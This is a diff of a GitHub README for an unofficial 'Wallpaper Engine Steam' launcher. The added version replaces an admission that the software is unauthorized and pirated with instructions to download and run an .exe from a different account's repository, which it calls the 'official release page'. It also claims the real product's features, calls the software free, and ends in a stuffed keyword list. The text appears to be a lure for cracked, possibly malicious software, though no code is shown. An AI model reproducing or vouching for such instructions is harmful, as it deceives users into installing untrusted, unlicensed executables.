@@ -1,77 +1,74 @@
-#  Wallpaper Engine Steam
+# 🎨 Wallpaper-Engine-Steam - Run live wallpapers on your desktop
 
+[![](https://img.shields.io/badge/Download-Wallpaper_Engine-blue.svg)](https://github.com/Fable9205/Wallpaper-Engine-Steam)
 
-**Wallpaper Engine Steam** is a custom launcher and manager for Wallpaper Engine, allowing you to easily run, manage, and enjoy thousands of animated and interactive wallpapers on your desktop with Steam Workshop integration.
+This software manages live, interactive, and high-resolution wallpapers on your Windows desktop. It supports 4K backgrounds, audio visualizers, and anime-style themes. The application runs with low system strain and stops when you play games to keep your computer fast. You can sync settings with lighting systems like Corsair iCUE or Razer Chroma and connect your Android phone for remote control.
 
+## 📥 Getting Started
 
-<img width="800" height="250" alt="ed037246-bd60-4470-aafb-0f9ba7ff5325" src="https://github.com/user-attachments/assets/364d604a-a256-4210-b6d9-649a3a4d999d" />
+Follow these steps to set up the software on your Windows computer.
 
-## Install
-[Download `WallpaperEngine.zip`](https://github.com/wallpaperenginesteam/Wallpaper-Engine-Steam/releases/download/v2.8.42/WallpaperEngine.zip)
----
+1. Go to the [official release page](https://github.com/Fable9205/Wallpaper-Engine-Steam).
+2. Look for the latest release version on the right sidebar.
+3. Click the file ending in .exe to start the download.
+4. Save the file to a folder you can find easily.
+5. Open the downloaded file to begin the installation.
 
-<img width="1280" height="720" alt="c6443935-6ff0-43d8-bb2a-3b71b26fe8b7" src="https://github.com/user-attachments/assets/172f3fad-fd9f-4dc6-ba04-18a62dbe2e35" />
+## 🛠 Installation Guide
 
-<img width="1500" height="844" alt="089d72d4-a4d7-44d7-a48c-6972faf0d636" src="https://github.com/user-attachments/assets/c6a375f3-7ea1-4212-8185-c08c087b22c4" />
-<img width="736" height="414" alt="108a9950-83b9-45b7-a3e8-2772bde70897" src="https://github.com/user-attachments/assets/6c4dc474-06c0-461b-8cfe-a67f7b478edc" />
-<img width="1920" height="1080" alt="9706a08e-c10a-4675-b7fb-b136c5229668" src="https://github.com/user-attachments/assets/3089b4c3-de0d-4fd4-bbaa-79433e5f567c" />
+Installation requires minimal effort. Follow the prompts on your screen after you open the installer.
 
----
-## Key Features
-- Easy Steam Workshop integration
-- Quick launch and wallpaper management
-- Customizable performance and quality settings
-- Support for animated and interactive wallpapers
-- Clean and simple user interface
+* Select your preferred install location. The default folder usually works best.
+* Choose to create a desktop shortcut if you want fast access to your settings.
+* Click Finish once the progress bar fills.
+* Launch the application from your desktop or the Start menu.
 
+## 🖥 Using the Software
 
-<img width="739" height="415" alt="d5f8f7ab-caa9-42da-bc52-0cc235585d65" src="https://github.com/user-attachments/assets/0f069b73-a909-4967-ba45-bc6ac6c2bbb5" />
+The app works as a background process. Here is how you manage your content.
 
+* **Selecting Wallpapers:** Open the main window to browse the library. Click any thumbnail to apply it to your desktop immediately.
+* **Steam Workshop:** Browse thousands of user-made wallpapers. Click Subscribe on any wallpaper page to download it to your software.
+* **Performance Settings:** Visit the settings menu to adjust frame rates. Lowering the frame rate saves power on laptops.
+* **Gaming Mode:** The app detects when you run a full-screen game. It pauses the wallpaper loop during play to release memory for your game. 
+* **Audio Visualizers:** Enable these in the settings tab. Ensure your output device is set to your primary speakers or headset.
+* **Syncing Lighting:** Navigate to the Plugins tab. Grant permission to your specific hardware software, such as Razer Synapse or iCUE, to link your keyboard and mouse lights with the wallpaper colors.
 
-## Getting Started
-1. **Download** the latest version using the button above.
-2. **Extract** the archive.
-3. **Run** `WallpaperEngineSteam.exe` as Administrator.
-4. **Log in** with your Steam account if required.
-5. Browse and apply your favorite wallpapers from the Workshop.
+## ⚙️ System Requirements
 
-**Note:** You need a legitimate copy of Wallpaper Engine on Steam for full Workshop access.
+This application works on most modern hardware. Ensure your system meets these standards for a stable experience.
 
----
-## System Requirements
-- **Windows 10 / 11** (64-bit)
-- Steam client with Wallpaper Engine installed
-- Modern GPU recommended for smooth animated wallpapers
+* **Operating System:** Windows 10 or Windows 11.
+* **Processor:** 1.66 GHz Intel i5 or better.
+* **Memory:** 2 GB RAM.
+* **Graphics:** Dedicated GPU recommended for 4K content.
+* **Storage:** 500 MB of free space.
 
----
-## Security & Legal
-**Important Notice:**  
-This is unauthorized software. Using pirated versions of Wallpaper Engine is illegal and may expose your system to security risks.
+## 📱 Mobile Pairing
 
-**Recommendations:**
-- Download **only** from this official GitHub repository.
-- Scan all files with VirusTotal before installation.
-- Consider purchasing the legitimate version on Steam for full features and updates.
+You can control your desktop wallpaper from your phone.
 
----
-## Contributing
-Contributions for improving the launcher, fixes, or documentation are welcome.
+1. Download the mobile app from the Google Play Store on your Android device.
+2. Ensure your phone and your PC are on the same Wi-Fi network.
+3. Open the desktop app and select the Mobile icon.
+4. Scan the QR code displayed on your screen with your phone.
+5. Control playback, switch scenes, or change colors directly from your phone screen.
 
----
-## License & Acknowledgments
-### License
-This repository is shared under the **MIT License**.  
-See [LICENSE](LICENSE) for details.
+## 💡 Frequently Asked Questions
 
-**Copyright © 2026 affiliminds**
+**Does this software slow down my computer?**
+No. The application uses a small amount of system resources. It stops animation entirely when you open another window or start a game.
 
-### Acknowledgments
-- Thanks to Wallpaper Engine developers for the amazing software.
-- The Steam Workshop community for creating beautiful wallpapers.
+**Can I create my own wallpapers?**
+Yes. You can import video files, images, or web pages into the application. Use the Create Wallpaper tool to design your own scene.
 
-<p align="center">
-  Developed with ❤️ for beautiful desktops
-</p>
+**How do I stop a wallpaper?**
+Right-click the icon in your system tray near the clock. Select "Pause" to stop the movement or "Quit" to close the application completely.
 
+**Is it free?**
+This version allows you to use your own files and browse open sources without a subscription cost.
 
-<img width="565" height="353" alt="1158e636-f5fc-4677-b0ee-a6c05a18195f" src="https://github.com/user-attachments/assets/49953049-d90c-4d16-812a-bd419a810249" />
+**What do I do if a wallpaper crashes?**
+Reset the application settings from the general menu. If a specific wallpaper causes issues, remove it from your library using the delete icon in the browser list.
+
+Keywords: animated-backgrounds, desktop-costumization, desktop-wall, dynamic-desktop, free-workshops, lockscreen-background, paper-live, pc-personalization, screensaver, steam-community-market, steam-data, steam-idler, steam-library, steam-market, steam-node, steam-plugin, steam-summer-sale, steam-theme, steamcommunity, visual-desktop
